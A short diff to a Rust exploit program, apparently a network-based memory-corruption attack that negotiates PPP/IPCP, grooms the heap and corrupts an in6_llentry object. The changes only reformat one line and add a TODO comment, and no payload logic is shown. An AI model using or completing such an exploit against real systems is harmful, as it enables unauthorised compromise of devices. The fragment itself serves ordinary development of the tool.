@@ -19,9 +19,7 @@ fn run_exploit(interface_name: String) {
 
     // Find the network interface with the provided name
     let interfaces = datalink::interfaces();
-    let interface = interfaces
-        .into_iter().find(interface_names_match)
-        .unwrap();
+    let interface = interfaces.into_iter().find(interface_names_match).unwrap();
     // Exploit
     let mut expl = Exploit {
         target_mac: [0, 0, 0, 0, 0, 0],
@@ -39,7 +37,7 @@ fn run_exploit(interface_name: String) {
     expl.ipcp_negotiation(&interface);
     println!("[*] Initial Negotiations Done...");
     println!("[*] Starting Heap Grooming...");
-    expl.heap_grooming(&interface);
+    expl.heap_grooming(&interface); //TODO make the session ids actually replying to the actual messages
     println!("[*] STAGE 1: Memory corruption");
     println!("[+] Pinning to CPU 0...done");
     println!("[*] Corrupt in6_llentry object...");
